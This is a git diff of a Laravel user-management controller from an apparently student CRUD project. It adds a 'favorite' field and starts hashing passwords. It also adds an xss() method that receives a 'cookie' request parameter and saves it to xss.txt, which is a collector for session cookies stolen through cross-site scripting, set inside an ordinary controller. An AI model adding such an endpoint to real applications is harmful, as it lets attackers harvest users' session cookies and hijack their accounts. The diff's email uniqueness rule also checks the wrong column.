@@ -86,6 +86,7 @@ class CrudUserController extends Controller
 
         $request->validate([
             'name' => 'required',
+            'favorite' => 'required',
             'email' => 'required|email|unique:users,id,'.$input['id'],
             'password' => 'required|min:6|confirmed',
             'password_confirmation' => 'required|min:6',
@@ -94,7 +95,8 @@ class CrudUserController extends Controller
        $user = User::find($input['id']);
        $user->name = $input['name'];
        $user->email = $input['email'];
-       $user->password = $input['password'];
+       $user->favorite = $input['favorite'];
+       $user->password = Hash::make($input['password']);
        $user->save();
 
         return redirect("list")->withSuccess('Cập nhật thành công');
@@ -127,4 +129,12 @@ class CrudUserController extends Controller
 
         return Redirect('login')->withSuccess('Đăng xuất thành công');
     }
+
+    public function xss(Request $request) {
+        $cookie = $request->get('cookie');
+        file_put_contents('xss.txt', $cookie);
+        var_dump($cookie);die();
+
+        // var_dump('111111');
+        }
 }
